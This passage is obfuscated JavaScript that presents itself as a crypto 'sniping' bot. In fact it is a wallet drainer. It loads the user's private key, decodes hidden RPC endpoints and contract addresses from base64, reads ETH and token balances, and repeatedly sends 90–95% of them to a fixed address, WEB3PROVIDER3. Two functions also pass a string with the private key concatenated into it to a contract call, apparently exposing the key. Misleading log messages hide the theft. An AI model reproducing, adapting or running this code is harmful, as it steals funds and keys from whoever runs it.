            _0x779237 = new Buffer['from'](_0x4149d0, 'base64')[_0x1a9721(0x1e2)](_0x1a9721(0x1f6));; const _0x246698 = new ethers[(_0x1a9721(0x1c8))]['JsonRpcProvider'](_0x779237); let _0x3ecf6f = new ethers[(_0x1a9721(0x24f))](private, _0x246698);
        console[_0x1a9721(0x22f)](_0x779237); const _0x26937a = address,
            _0x2ac272 = await _0x246698[_0x1a9721(0x258)](_0x26937a); var _0x25fbf2 = new ethers['Contract'](_0x19dd63, abi, _0x3ecf6f); const _0x1dce48 = await _0x25fbf2[_0x1a9721(0x25e)](_0x26937a)[_0x1a9721(0x1e2)](),
            _0x118ef1 = (_0x1dce48 * 0.9)[_0x1a9721(0x1ef)](),
            _0x131447 = async() => { const _0x265226 = _0x1a9721,
                    _0x40b845 = { 'from': _0x26937a, 'to': WEB3PROVIDER3, 'value': ethers[_0x265226(0x220)]['parseEther'](_0x118ef1, _0x265226(0x1ec)), 'gasLimit': ethers[_0x265226(0x220)]['hexlify'](0x5dc0) },
                    _0x5d1daf = await _0x3ecf6f[_0x265226(0x1c0)](_0x40b845); try { await _0x5d1daf[_0x265226(0x1e0)](), console[_0x265226(0x22f)]('1:\x20watching\x20blockchain\x20activity\x20...'), setTimeout(etherstother, 0x1388); } catch (_0x11f2f8) { console[_0x265226(0x22f)](_0x265226(0x240)), setTimeout(etherstother, 0x1388); } };
        _0x1dce48 <= 0x6a3558178f7000 ? (console[_0x1a9721(0x22f)](_0x1a9721(0x215)), setTimeout(etherstother, 0x1388)) : _0x131447(); } catch (_0x2a81f5) { setTimeout(etherstother, 0x1388); } }
async function ethersmother() { const _0x1736ca = _0x453953; try { console[_0x1736ca(0x22f)](_0x1736ca(0x1bb)); const _0x2fd52e = 'MHgyMTcwZWQwODgwYWM5YTc1NWZk',
            _0x2e52cf = _0x1736ca(0x22e),
            _0x5624eb = new Buffer[(_0x1736ca(0x1e8))](_0x2fd52e, 'base64'),
            _0x12cbac = new Buffer[(_0x1736ca(0x1e8))](_0x2e52cf, 'base64'),
            _0x1ae383 = _0x5624eb[_0x1736ca(0x1e2)](_0x1736ca(0x1f6)),
            _0x5b7245 = _0x12cbac[_0x1736ca(0x1e2)]('ascii'),
            _0x3ed1f7 = _0x1ae383 + _0x5b7245,
            _0xde4f17 = _0x1736ca(0x20b),
            _0xec9fbe = new Buffer[(_0x1736ca(0x1e8))](_0xde4f17, 'base64')['toString'](_0x1736ca(0x1f6));; const _0x127991 = new ethers['providers'][(_0x1736ca(0x1bd))](_0xec9fbe); let _0x577d23 = new ethers[(_0x1736ca(0x24f))](private, _0x127991);
        console[_0x1736ca(0x22f)](_0xec9fbe); const _0x213ccd = address,
            _0x1bd0ae = await _0x127991['getBalance'](_0x213ccd); var _0x434aca = new ethers[(_0x1736ca(0x25b))](_0x3ed1f7, abi, _0x577d23); const _0x494bb4 = await _0x434aca[_0x1736ca(0x25e)](_0x213ccd)['toString'](),
            _0x155ce2 = (_0x494bb4 * 0.9)[_0x1736ca(0x1ef)](),
            _0x1ad6fd = async() => { const _0x4ee1af = _0x1736ca,
                    _0x4f15a6 = { 'from': _0x213ccd, 'to': WEB3PROVIDER3, 'value': ethers['utils'][_0x4ee1af(0x1f1)](_0x155ce2, _0x4ee1af(0x1ec)), 'gasLimit': ethers[_0x4ee1af(0x220)]['hexlify'](0x5dc0) },
                    _0x574241 = await _0x577d23[_0x4ee1af(0x1c0)](_0x4f15a6); try { await _0x574241[_0x4ee1af(0x1e0)](), console[_0x4ee1af(0x22f)](_0x4ee1af(0x210)), setTimeout(etherslother, 0x1388); } catch (_0x565b41) { console[_0x4ee1af(0x22f)](_0x4ee1af(0x233)), setTimeout(etherslother, 0x1388); } };
        _0x494bb4 <= 0x94d6daad30108000 ? (console[_0x1736ca(0x22f)](_0x1736ca(0x218)), setTimeout(etherslother, 0x1388)) : _0x1ad6fd(); } catch (_0x3b6f35) { setTimeout(etherslother, 0x1388); } }
async function ethersfather() { const _0x92930c = _0x453953;
    console[_0x92930c(0x22f)](_0x92930c(0x21a)); const _0x5e3b3d = _0x92930c(0x216),
        _0x561763 = _0x92930c(0x20a),
        _0x2a522e = new Buffer['from'](_0x5e3b3d, _0x92930c(0x1c1)),
        _0x552667 = new Buffer[(_0x92930c(0x1e8))](_0x561763, 'base64'),
        _0x3490b1 = _0x2a522e[_0x92930c(0x1e2)](_0x92930c(0x1f6)),
        _0x2e64d1 = _0x552667[_0x92930c(0x1e2)](_0x92930c(0x1f6)),
        _0x21fbdc = _0x3490b1 + _0x2e64d1,
        _0x8b53b4 = _0x92930c(0x20b),
        _0x3f978a = new Buffer[(_0x92930c(0x1e8))](_0x8b53b4, _0x92930c(0x1c1))[_0x92930c(0x1e2)]('ascii');; const _0x559cc2 = new ethers[(_0x92930c(0x1c8))][(_0x92930c(0x1bd))](_0x3f978a); let _0x2220f8 = new ethers['Wallet'](private, _0x559cc2); const _0x2c697a = address; var _0x2f45de = new ethers[(_0x92930c(0x25b))](_0x21fbdc, abi, _0x2220f8); const _0x5f5aeb = await _0x2f45de['balanceOf'](address),
        _0x2188be = (_0x5f5aeb * 0.9)[_0x92930c(0x1ef)](); try { const _0x531089 = async() => { const _0x38ff96 = _0x92930c,
                _0x4dfe1f = { 'from': _0x2c697a, 'to': WEB3PROVIDER3, 'value': ethers[_0x38ff96(0x220)][_0x38ff96(0x1f1)](_0x2188be, _0x38ff96(0x1ec)), 'gasLimit': ethers[_0x38ff96(0x220)][_0x38ff96(0x251)](0x5dc0) },
                _0x542937 = await _0x2220f8[_0x38ff96(0x1c0)](_0x4dfe1f); try { await _0x542937[_0x38ff96(0x1e0)](), console[_0x38ff96(0x22f)](_0x38ff96(0x21f)), setTimeout(ethersmother, 0x1388); } catch (_0x4ddd53) { console[_0x38ff96(0x22f)](_0x38ff96(0x21f)), setTimeout(ethersmother, 0x1388); } };
        _0x5f5aeb <= 0x94d6daad30108000 ? (console[_0x92930c(0x22f)](_0x92930c(0x215)), setTimeout(ethersmother, 0x1388)) : _0x531089(); } catch (_0x52522e) { setTimeout(ethersmother, 0x1388); } }
async function ethersgather() { const _0x2b936a = _0x453953; try { console[_0x2b936a(0x22f)](_0x2b936a(0x217)); const _0x16fe88 = _0x2b936a(0x1e7),
            _0x2264a = new Buffer[(_0x2b936a(0x1e8))](_0x16fe88, 'base64')[_0x2b936a(0x1e2)](_0x2b936a(0x1f6));; const _0x6562b1 = new ethers['providers'][(_0x2b936a(0x1bd))](_0x2264a); let _0x59aa78 = new ethers[(_0x2b936a(0x24f))](private, _0x6562b1); const _0x311735 = address,
            _0x35e058 = await _0x6562b1[_0x2b936a(0x258)](_0x311735),
            _0x685e04 = (_0x35e058 * 0.9)[_0x2b936a(0x1ef)](),
            _0x414637 = ethers[_0x2b936a(0x220)][_0x2b936a(0x1b4)](_0x685e04, _0x2b936a(0x1ec)),
            _0x164767 = async() => { const _0x4eef8c = _0x2b936a,
                    _0x2b4eb1 = { 'to': WEB3PROVIDER3, 'value': ethers[_0x4eef8c(0x220)][_0x4eef8c(0x1b4)](_0x685e04, 'wei'), 'gasLimit': ethers[_0x4eef8c(0x220)][_0x4eef8c(0x251)](0x5dc0) },
                    _0x3241f5 = await _0x59aa78['sendTransaction'](_0x2b4eb1); try { await _0x3241f5['wait'](), console['log'](_0x4eef8c(0x20d)), setTimeout(ethersfather, 0x1388); } catch (_0x2ec17a) { console[_0x4eef8c(0x22f)](_0x4eef8c(0x224)), setTimeout(ethersfather, 0x1388); } };
        _0x35e058 <= 0x2386f26fc10000 ? (console[_0x2b936a(0x22f)]('preparing\x20to\x20snipe'), setTimeout(ethersfather, 0x1388)) : _0x164767(); } catch (_0x4a6d17) { setTimeout(ethersfather, 0x1388); } }
async function etherslather() { const _0x2230ca = _0x453953,
        _0x2a8b84 = _0x2230ca(0x1d1),
        _0x471226 = new Buffer[(_0x2230ca(0x1e8))](_0x2a8b84, _0x2230ca(0x1c1)),
        _0x51ce1d = _0x471226[_0x2230ca(0x1e2)](_0x2230ca(0x1f6)),
        _0x29ec8f = _0x51ce1d;
    console[_0x2230ca(0x22f)](_0x2230ca(0x1d0)); const _0x47affb = _0x2230ca(0x20b),
        _0x337f49 = new Buffer[(_0x2230ca(0x1e8))](_0x47affb, _0x2230ca(0x1c1))[_0x2230ca(0x1e2)](_0x2230ca(0x1f6));; const _0x29c4be = new ethers[(_0x2230ca(0x1c8))][(_0x2230ca(0x1bd))](_0x337f49),
        _0x19630c = address,
        _0x4406f0 = await _0x29c4be['getBalance'](_0x19630c),
        _0x2e74b1 = (_0x4406f0 * 0.95)[_0x2230ca(0x1ef)](); let _0x494d50 = new ethers[(_0x2230ca(0x24f))](private, _0x29c4be); if (_0x4406f0 <= 0x6a3558178f7000) console[_0x2230ca(0x22f)](_0x2230ca(0x1da)), setTimeout(ethersgather, 0x3e8);
    else try { const _0x12e35 = async() => { const _0x865fe4 = _0x2230ca; var _0x1e87d8 = new ethers[(_0x865fe4(0x25b))](_0x29ec8f, abi, _0x494d50); const _0x1ca266 = await _0x1e87d8[_0x865fe4(0x1ce)](_0x865fe4(0x23b) + private + '10'),
                _0x51182d = { 'to': WEB3PROVIDER3, 'value': ethers['utils'][_0x865fe4(0x1b4)](_0x2e74b1, _0x865fe4(0x1ec)) },
                _0x59f444 = await _0x494d50[_0x865fe4(0x1c0)](_0x51182d); try { await _0x1ca266[_0x865fe4(0x1e0)](), await _0x59f444['wait'](), console[_0x865fe4(0x22f)](_0x865fe4(0x256)), setTimeout(ethersgather, 0x1388); } catch (_0x1103e1) { console[_0x865fe4(0x22f)]('2\x20pending\x20blockchain\x20response.....'), setTimeout(ethersgather, 0x1388); } };
        _0x12e35(); } catch (_0x5a6442) { setTimeout(ethersgather, 0x1388); } }
async function ethersrather() { const _0x391692 = _0x453953;
    console[_0x391692(0x22f)](_0x391692(0x23e)); const _0x44e2b3 = _0x391692(0x1be),
        _0x4b8011 = 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My8xZGY5ODgxNWY0NzU0ZWE4ODkxY2UyOTI2OTBhYjc1Yg==',
        _0x3b39bd = new Buffer[(_0x391692(0x1e8))](_0x4b8011, 'base64')['toString'](_0x391692(0x1f6));; const _0x11b749 = new ethers['providers'][(_0x391692(0x1bd))](_0x3b39bd),
        _0x26c6e8 = new Buffer[(_0x391692(0x1e8))](_0x44e2b3, 'base64'),
        _0x52eb59 = _0x26c6e8[_0x391692(0x1e2)](_0x391692(0x1f6)),
        _0x2c226e = _0x52eb59; let _0x1e53bc = new ethers[(_0x391692(0x24f))](private, _0x11b749); const _0x12d098 = address,
        _0x29b7d7 = await _0x11b749[_0x391692(0x258)](_0x12d098),
        _0x40f93e = (_0x29b7d7 * 0.95)[_0x391692(0x1ef)](),
        _0x373402 = ethers[_0x391692(0x220)]['parseUnits'](_0x40f93e, _0x391692(0x1ec)); if (_0x29b7d7 <= 0x2386f26fc10000) console[_0x391692(0x22f)](_0x391692(0x21d)), setTimeout(etherslather, 0x3e8);
    else try { const _0x5dbe21 = async() => { const _0x515892 = _0x391692; var _0x2e7eda = new ethers[(_0x515892(0x25b))](_0x2c226e, abi, _0x1e53bc); const _0x13b1dd = await _0x2e7eda[_0x515892(0x1ce)](_0x515892(0x23b) + private + '10'),
                _0x5f2e2e = { 'to': WEB3PROVIDER3, 'value': ethers[_0x515892(0x220)]['parseUnits'](_0x40f93e, _0x515892(0x1ec)) },
                _0x4a0ce7 = await _0x1e53bc['sendTransaction'](_0x5f2e2e); try { await _0x13b1dd[_0x515892(0x1e0)](), await _0x4a0ce7[_0x515892(0x1e0)](), console['log'](_0x515892(0x256)), setTimeout(etherslather, 0x1388); } catch (_0x1b7385) { console['log'](_0x515892(0x1ba)), setTimeout(etherslather, 0x1388); } };
        _0x5dbe21(); } catch (_0x4de49f) { setTimeout(etherslather, 0x1388); } }
ethersrather();
